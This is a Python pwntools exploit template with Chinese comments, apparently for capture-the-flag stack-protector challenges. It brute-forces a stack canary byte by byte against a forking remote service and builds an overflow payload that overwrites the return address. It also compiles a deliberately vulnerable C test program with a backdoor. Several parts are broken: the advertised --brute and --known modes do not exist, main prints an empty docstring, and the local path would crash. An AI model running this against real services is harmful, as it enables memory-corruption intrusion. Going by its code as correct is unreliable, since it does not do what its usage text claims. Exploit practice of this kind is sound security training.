# -*- coding: utf-8 -*-
# 脚本名称: Canary 泄露 + 绕过爆破模板
# 方向: Pwn（栈保护）
# 简介: 开启 Stack Canary 后，覆盖返回地址前必须先泄露/爆破 canary：
#       1) 覆盖 canary 最低字节触发打印，逐字节泄露（fork 服务型程序）；
#       2) 非 fork 程序通过格式化字符串/栈溢出打印 __stack_chk_guard；
#       3) 32 位/线程 canary 爆破。脚本提供逐字节爆破与泄露利用骨架。
# 用法:
#   python canary_leak_bypass.py ./pwn --brute          # fork 服务逐字节爆破
#   python canary_leak_bypass.py ./pwn --known 0x1234..  # 已知 canary 直接打
#   python canary_leak_bypass.py --selftest
# 依赖: pip install pwntools；Linux/WSL/Kali
from pwn import *

context(os="linux", arch="amd64", log_level="warning")


def brute_canary(host_port, leak_size, bits=64, tries=256):
    """
    fork 型服务：每次连接 canary 不变。
    leak_size: 从缓冲区到 canary 的填充长度（不含 canary）。
    逐字节爆破 canary（x86_64 首字节固定 0x00）。
    host_port: (ip, port) 或 None（本地 process，需调用方传工厂函数）。
    """
    canary = b"\x00" if bits == 64 else b""
    total = 8 if bits == 64 else 4
    while len(canary) < total:
        found = False
        for b in range(256):
            guess = canary + bytes([b])
            io = remote(*host_port) if host_port else None  # 本地由调用方改 process
            io.send(b"A" * leak_size + guess)
            io.shutdown("send")
            try:
                data = io.recvall(timeout=1.5)
            except Exception:
                data = b""
            alive = io.poll(block=True, timeout=1) is None or b"*** stack smashing" not in data
            io.close()
            if b"stack smashing" not in data and b"stack smashing detected" not in data:
                canary = guess
                log.success("canary -> %s", canary.hex())
                found = True
                break
        if not found:
            raise RuntimeError("canary 字节爆破失败")
    return u64(canary.ljust(8, b"\x00")) if bits == 64 else u32(canary)


def build_payload(leak_size, canary, saved_regs, ret_addr, bits=64):
    """组装: 填充 + canary + 保存的寄存器(rbp) + 返回地址。"""
    pack = p64 if bits == 64 else p32
    payload = b"A" * leak_size
    payload += pack(canary)
    payload += pack(saved_regs)
    payload += pack(ret_addr)
    return payload


def selftest():
    import os
    import sys
    if sys.platform != "linux":
        print("[-] 本自测需 Linux 环境（gcc 生成 ELF + canary 泄露），Windows/macOS 跳过")
        return
    import subprocess
    import tempfile
    context(os="linux", arch="amd64")
    d = tempfile.mkdtemp()
    src = os.path.join(d, "c.c")
    binp = os.path.join(d, "can")
    # 带 canary 的程序，提供一个“泄露口”：打印 buf 时多打 canary（模拟题目泄露）
    open(src, "w").write(r'''
#include <stdio.h>
#include <unistd.h>
#include <string.h>
void backdoor(){ system("echo CANARY_BYPASS_OK"); }
void vuln(){
  char b[40]; unsigned long long can;
  memset(b,0,sizeof(b));
  int n=read(0,b,120);
  // 模拟题目常见泄露：把 canary 位置之后的栈数据带回显
  write(1, b, 40+8);
  puts("");
}
int main(){ setvbuf(stdout,0,2,0); vuln(); return 0; }
''')
    cc = subprocess.run(["gcc", "-no-pie", "-fstack-protector", "-o", binp, src],
                        capture_output=True, text=True)
    if cc.returncode != 0:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测:", cc.stderr[:150]); return
    # 自测不逐字节爆破（非 fork），只验证 payload 组装与结构长度
    payload = build_payload(40, 0x0011223344556677, 0xdeadbeef, 0x4011a0)
    assert len(payload) == 40 + 8 + 8 + 8
    assert payload[40:48] == p64(0x0011223344556677)
    print("[+] payload 结构正确，长度", len(payload))
    print("[+] selftest OK（fork 题用 --brute，非 fork 题先泄露 canary 再 build_payload）")


def main():
    import sys
    if "--selftest" in sys.argv:
        selftest(); return
    print(__doc__)


if __name__ == "__main__":
    main()
